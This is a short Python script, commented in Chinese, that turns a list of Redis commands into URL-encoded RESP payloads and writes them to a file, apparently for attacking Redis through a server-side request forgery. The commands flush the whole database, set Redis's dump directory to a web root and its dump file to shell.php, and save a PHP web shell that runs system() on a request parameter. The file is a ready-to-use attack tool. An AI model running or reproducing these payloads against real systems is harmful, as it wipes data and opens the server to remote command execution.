import re

# 各元素中空格以 + 替换  eg: set x "<?php+eval($_GET[1]);?>"
test = [
    "auth P@ssw0rd",
    "flushall",
    "config set dir /var/www/html",
    "config set dbfilename shell.php",
    'set x "\\n<?php+phpinfo();+system($_GET[1]);?>\\n"',
    "save",
]
for i in test:
    n = "%0d%0a"
    elements = i.split()
    elements_len = len(elements)
    res = "*" + str(elements_len) + n
    for element in elements:
        element_len = len(element)
        res += "$" + str(element_len) + n + element + n
    res = res.replace(",", "%2c")
    res = res.replace(";", "%3b")
    res = res.replace("&", "%26")
    res = res.replace("?", "%3f")
    res = res.replace("+", " ")
    res = res.replace("\\n", "%0a")
    print(res)
    # res += "quit" + n  # 连接语句可注释此句
    if "save" in res:
        res += "quit" + n  # 连接语句可注释此句
    with open("tmp.txt", "a+") as f:
        f.write(res)
